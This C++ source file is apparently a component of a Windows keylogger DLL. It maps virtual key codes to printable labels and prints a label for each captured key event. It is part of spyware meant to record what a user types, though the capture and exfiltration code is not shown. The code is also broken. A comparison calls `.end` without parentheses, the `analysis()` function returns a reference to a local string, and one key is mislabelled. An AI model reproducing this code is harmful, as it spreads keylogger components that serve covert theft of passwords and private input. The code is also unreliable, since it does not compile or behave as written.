
#include			"keylogger_dll\Analyser.h"

Analyser::Analyser()
{
initMap();
}

Analyser::~Analyser()
{
}

std::string&				Analyser::analysis(AEvent* event)
{
	if (_translateMap.find(event->getVirtualKeyCode()) != _translateMap.end)
		std::cout << _translateMap[event->getVirtualKeyCode()].c_str() << std::endl;
		std::string s("");
	return s;
}

void						Analyser::initMap()
{
	_translateMap[VK_CANCEL] = "[Cancel]";
	_translateMap[VK_SPACE] = " ";
	_translateMap[VK_LCONTROL] = "[LCtrl]";
	_translateMap[VK_RCONTROL] = "[RCtrl]";
	_translateMap[VK_LMENU] = "[LAlt]";
	_translateMap[VK_RMENU] = "[RAlt]";
	_translateMap[VK_LWIN] = "[LWindows]";
	_translateMap[VK_RWIN] = "[RWindows]";
	_translateMap[VK_APPS] = "[Applications]";
	_translateMap[VK_SNAPSHOT] = "[PrintScreen]";
	_translateMap[VK_INSERT] = "[Insert]";
	_translateMap[VK_PAUSE] = "[Pause]";
	_translateMap[VK_VOLUME_MUTE] = "[VolumeMute]";
	_translateMap[VK_VOLUME_DOWN] = "[VolumeDown]";
	_translateMap[VK_VOLUME_UP] = "[VolumeUp]";
	_translateMap[VK_SELECT] = "[Select]";
	_translateMap[VK_HELP] = "[Help]";
	_translateMap[VK_EXECUTE] = "[Execute]";
	_translateMap[VK_DELETE] = "[Delete]";
	_translateMap[VK_CLEAR] = "[Clear]";
	_translateMap[VK_RETURN] = "[Enter]";
	_translateMap[VK_BACK] = "[Backspace]";
	_translateMap[VK_TAB] = "[Tab]";
	_translateMap[VK_ESCAPE] = "[Escape]";
	_translateMap[VK_LSHIFT] = "[LShift]";
	_translateMap[VK_RSHIFT] = "[RShift]";
	_translateMap[VK_CAPITAL] = "[CapsLock]";
	_translateMap[VK_NUMLOCK] = "[NumLock]";
	_translateMap[VK_SCROLL] = "[ScrollLock]";
	_translateMap[VK_HOME] = "[Home]";
	_translateMap[VK_END] = "[End]";
	_translateMap[VK_PLAY] = "[Play]";
	_translateMap[VK_ZOOM] = "[Zoom]";
	_translateMap[VK_DIVIDE] = "[/]";
	_translateMap[VK_MULTIPLY] = "[*]";
	_translateMap[VK_SUBTRACT] = "[-]";
	_translateMap[VK_ADD] = "[+]";
	_translateMap[VK_PRIOR] = "[PageUp]";
	_translateMap[VK_NEXT] = "[PageDown]";
	_translateMap[VK_LEFT] = "[LArrow]";
	_translateMap[VK_RIGHT] = "[RArrow]";
	_translateMap[VK_UP] = "[UpArrow]";
	_translateMap[VK_DOWN] = "[DownArrow]";
	_translateMap[VK_NUMPAD0] = "[0]";
	_translateMap[VK_NUMPAD1] = "[1]";
	_translateMap[VK_NUMPAD2] = "[2]";
	_translateMap[VK_NUMPAD3] = "[3]";
	_translateMap[VK_NUMPAD4] = "[4]";
	_translateMap[VK_NUMPAD5] = "[5]";
	_translateMap[VK_NUMPAD6] = "[6]";
	_translateMap[VK_NUMPAD7] = "[7]";
	_translateMap[VK_NUMPAD8] = "[8]";
	_translateMap[VK_NUMPAD9] = "[9]";
	_translateMap[VK_F1] = "[F1]";
	_translateMap[VK_F2] = "[F2]";
	_translateMap[VK_F3] = "[F3]";
	_translateMap[VK_F4] = "[F4]";
	_translateMap[VK_F5] = "[F5]";
	_translateMap[VK_F6] = "[F6]";
	_translateMap[VK_F7] = "[F7]";
	_translateMap[VK_F8] = "[F8]";
	_translateMap[VK_F9] = "[F9]";
	_translateMap[VK_F10] = "[F10]";
	_translateMap[VK_F11] = "[F11]";
	_translateMap[VK_F12] = "[F12]";
	_translateMap[VK_F13] = "[F13]";
	_translateMap[VK_F14] = "[F14]";
	_translateMap[VK_F15] = "[F15]";
	_translateMap[VK_F16] = "[F16]";
	_translateMap[VK_F17] = "[F17]";
	_translateMap[VK_F18] = "[F18]";
	_translateMap[VK_F19] = "[F19]";
	_translateMap[VK_F20] = "[F20]";
	_translateMap[VK_F21] = "[F21]";
	_translateMap[VK_F22] = "[F22]";
	_translateMap[VK_F23] = "[F23]";
	_translateMap[VK_F24] = "[F24]";
	_translateMap[VK_OEM_2] = ",";
}